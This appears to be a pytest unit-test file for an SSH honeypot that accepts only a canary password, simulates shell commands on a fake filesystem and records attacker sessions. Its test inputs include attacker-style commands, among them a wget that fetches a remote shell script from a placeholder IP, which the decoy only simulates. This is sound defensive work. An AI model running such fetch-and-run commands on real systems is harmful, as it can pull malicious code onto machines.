"""SSH decoy behavior: canary-only auth at the server interface, plausible
command handling against the fake filesystem, and error resilience — one bad
command or channel error never ends a session (spec: never terminate on an
error; capture is the point)."""

import paramiko
import pytest

from services.decoy.fakefs import FakeFilesystem
from services.decoy.session import CREDENTIAL_REJECTED, DecoySession
from services.decoy.ssh_decoy import (
    _SIMULATED_CONTENT_MARKER,
    DECOY_SERVICE_NAME,
    _DecoyServerInterface,
    _DecoyShell,
    execute_command,
)

pytestmark = pytest.mark.unit


class FakeChannel:
    """A channel that yields scripted recv results and records sends."""

    def __init__(self, incoming):
        self._incoming = list(incoming)
        self.sent = bytearray()
        self.closed = False

    def sendall(self, data):
        # paramiko channels accept str and encode utf-8 — mirror that.
        self.sent.extend(data if isinstance(data, bytes) else data.encode("utf-8"))

    def recv(self, size):
        if not self._incoming:
            return b""  # EOF — the attacker closed the channel
        chunk = self._incoming.pop(0)
        if isinstance(chunk, Exception):
            raise chunk
        return chunk

    def close(self):
        self.closed = True


def _session(attacker_ip="203.0.113.7") -> DecoySession:
    return DecoySession(
        decoy_service=DECOY_SERVICE_NAME,
        attacker_ip=attacker_ip,
        ttl_seconds=3600,
    )


# --- canary-only auth -------------------------------------------------------


def test_canary_success_returns_successful_and_records(canary):
    interface = _DecoyServerInterface(canary, _session())
    result = interface.check_auth_password("root", canary.value)
    assert result == paramiko.AUTH_SUCCESSFUL
    assert interface._session.build_payload()["auth_attempts"] == [
        {"user": "root", "result": "success", "credential": "canary"}
    ]


def test_wrong_password_fails_and_records_rejected(canary):
    interface = _DecoyServerInterface(canary, _session())
    result = interface.check_auth_password("root", "totally-the-real-password")
    assert result == paramiko.AUTH_FAILED
    (attempt,) = interface._session.build_payload()["auth_attempts"]
    assert attempt == {
        "user": "root",
        "result": "failure",
        "credential": CREDENTIAL_REJECTED,
    }


def test_empty_username_is_still_recorded(canary):
    interface = _DecoyServerInterface(canary, _session())
    interface.check_auth_password("", "whatever")
    (attempt,) = interface._session.build_payload()["auth_attempts"]
    assert attempt["user"] == "(none)"


def test_repeated_guesses_all_land_on_the_session(canary):
    interface = _DecoyServerInterface(canary, _session())
    for i in range(5):
        interface.check_auth_password("root", f"guess-{i}")
    interface.check_auth_password("root", canary.value)
    attempts = interface._session.build_payload()["auth_attempts"]
    assert len(attempts) == 6
    assert attempts[-1]["result"] == "success"
    assert attempts[-1]["credential"] == "canary"


def test_only_password_auth_is_allowed(canary):
    interface = _DecoyServerInterface(canary, _session())
    assert interface.get_allowed_auths("root") == "password"


# --- command execution ------------------------------------------------------


def test_unknown_command_fails_like_bash():
    session = _session()
    out, cwd = execute_command(
        FakeFilesystem(), session, "/root", "definitelynotreal --flag"
    )
    assert out == "bash: definitelynotreal: command not found"
    assert cwd == "/root"


def test_sudo_passes_through_already_root():
    session = _session()
    out, _ = execute_command(FakeFilesystem(), session, "/root", "sudo whoami")
    assert out == "root"


def test_exit_returns_logout_output():
    out, _ = execute_command(FakeFilesystem(), _session(), "/root", "exit")
    assert out == "logout"


def test_cd_to_missing_directory_keeps_cwd():
    out, cwd = execute_command(FakeFilesystem(), _session(), "/root", "cd /nope")
    assert "No such file or directory" in out
    assert cwd == "/root"


def test_cat_missing_file_reports_bash_style_error():
    out, _ = execute_command(FakeFilesystem(), _session(), "/root", "cat /nope")
    assert "No such file or directory" in out


def test_empty_and_whitespace_commands_are_noops():
    fs = FakeFilesystem()
    assert execute_command(fs, _session(), "/root", "") == ("", "/root")
    assert execute_command(fs, _session(), "/root", "   ") == ("", "/root")


def test_wget_simulates_download_and_records_marked_file():
    session = _session()
    out, _ = execute_command(
        FakeFilesystem(), session, "/root", "wget http://198.51.100.9/x.sh"
    )
    assert "saved" in out
    (dropped,) = session.build_payload()["files_dropped"]
    assert dropped["name"] == "x.sh"
    assert dropped["source"] == "simulated-download"
    assert dropped["simulated"] is True
    assert len(dropped["sha256"]) == 64


def test_simulated_download_content_is_canary_marked():
    # The bytes the decoy "serves" are placeholders: the SHA in the capture
    # must be the hash of marked content, so the intel layer can spot it.
    import hashlib

    from services.decoy.ssh_decoy import _simulate_download

    session = _session()
    _simulate_download(session, "http://198.51.100.9/x.sh", now="2026-10-09 20:00")
    (dropped,) = session.build_payload()["files_dropped"]
    content = (
        f"#!/bin/sh\n# {_SIMULATED_CONTENT_MARKER}: http://198.51.100.9/x.sh\nexit 0\n"
    )
    assert dropped["sha256"] == hashlib.sha256(content.encode("utf-8")).hexdigest()


def test_every_command_produces_plausible_output():
    session = _session()
    fs = FakeFilesystem()
    cwd = "/root"
    outputs = []
    for command in ("whoami", "id", "uname -a"):
        out, cwd = execute_command(fs, session, cwd, command)
        outputs.append(out)
    # The shell (not execute_command) records commands — here we check the
    # outputs an attacker would see for this command run.
    assert outputs[0] == "root"
    assert outputs[1].startswith("uid=0(root)")
    assert "Linux" in outputs[2]


# --- error resilience (never terminate on an error) -------------------------


def test_shell_session_survives_a_channel_error(canary):
    """recv raising a paramiko error mid-session must be contained: the
    commands already captured survive, nothing propagates."""
    session = _session()
    channel = FakeChannel([b"whoami\n", paramiko.SSHException("boom")])
    _DecoyShell(channel, session, FakeFilesystem()).run()  # must not raise
    assert session.build_payload()["commands"] == ["whoami"]
    assert channel.closed is True  # finally-branch tidies the channel


def test_shell_session_survives_an_unexpected_error(canary):
    """A non-paramiko exception lands on the generic handler — same deal:
    capture already recorded is preserved, the shell finishes cleanly."""
    session = _session()
    channel = FakeChannel([b"whoami\n", RuntimeError("unexpected")])
    _DecoyShell(channel, session, FakeFilesystem()).run()  # must not raise
    assert session.build_payload()["commands"] == ["whoami"]
    assert channel.closed is True


def test_channel_is_closed_after_eof(canary):
    session = _session()
    channel = FakeChannel([b"whoami\n"])
    _DecoyShell(channel, session, FakeFilesystem()).run()
    assert channel.closed is True
    assert session.build_payload()["commands"] == ["whoami"]
